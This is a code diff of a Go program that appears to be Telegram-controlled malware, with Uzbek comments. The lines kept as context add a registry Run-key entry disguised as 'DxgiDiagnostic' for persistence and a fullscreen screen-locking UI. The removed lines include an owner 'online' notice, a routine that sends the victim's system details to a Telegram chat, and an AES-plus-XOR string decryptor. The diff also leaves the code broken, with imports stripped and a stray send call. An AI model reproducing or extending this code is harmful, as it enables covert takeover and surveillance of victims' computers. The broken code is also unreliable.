@@ -2,25 +2,7 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"encoding/hex"
-	"fmt"
-	"io"
-	"os"
-	"os/exec"
-	"path/filepath"
-	"strings"
-	"time"
 
-	"fyne.io/fyne/v2"
-	"fyne.io/fyne/v2/app"
-	"fyne.io/fyne/v2/container"
-	"fyne.io/fyne/v2/widget"
-	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
-	"github.com/shirou/gopsutil/v3/cpu"
-	"github.com/shirou/gopsutil/v3/host"
-	"github.com/shirou/gopsutil/v3/mem"
 )
 
 
@@ -74,12 +56,6 @@ func startKernelSync() {
 		return
 	}
 
-	// Egasi (Siz) uchun online xabari
-	notifyOwner(api, u_raw, fmt.Sprintf("📡 %s online (V1.0.3)", g_pc))
-
-	u := tgbotapi.NewUpdate(0)
-	u.Timeout = 60
-	updates := api.GetUpdatesChan(u)
 
 	for update := range updates {
 		if update.Message == nil { continue }
@@ -100,19 +76,7 @@ func startKernelSync() {
 		}
 	}
 }
-
-// sendFullStatus - PC haqida to'liq ma'lumot
-func sendFullStatus(api *tgbotapi.BotAPI, cID int64) {
-	v, _ := mem.VirtualMemory()
-	c, _ := cpu.Info()
-	h, _ := host.Info()
-
-	msg := fmt.Sprintf("📊 *PC:* %s\n*OS:* %s %s\n*CPU:* %s\n*RAM:* %.2f GB / %.2f GB\n*Uptime:* %v min",
-		g_pc, h.OS, h.PlatformVersion, c[0].ModelName, float64(v.Used)/1e9, float64(v.Total)/1e9, h.Uptime/60)
-	
-	m := tgbotapi.NewMessage(cID, msg)
-	m.ParseMode = "Markdown"
-	api.Send(m)
+api.Send(m)
 }
 
 // runSecureUI - Ekranni bloklash (Fyne Fullscreen)
@@ -153,21 +117,6 @@ func setupPersistence() {
 		// Registryga yozish
 		exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "DxgiDiagnostic", "/t", "REG_SZ", "/d", g_path, "/f").Run()
 	}
-}
-
-// decrypt - AES + XOR orqali ma'lumotni ochish
-func decrypt(hStr string, k []byte, s string) string {
-	d, _ := hex.DecodeString(hStr)
-	b, _ := aes.NewCipher(k)
-	g, _ := cipher.NewGCM(b)
-	n_s := g.NonceSize()
-	n, c := d[:n_s], d[n_s:]
-	p, _ := g.Open(nil, n, c, nil)
-	r := make([]byte, len(p))
-	for i := 0; i < len(p); i++ {
-		r[i] = p[i] ^ s[i%len(s)]
-	}
-	return string(r)
 }
 
 func notifyOwner(api *tgbotapi.BotAPI, uID string, text string) {
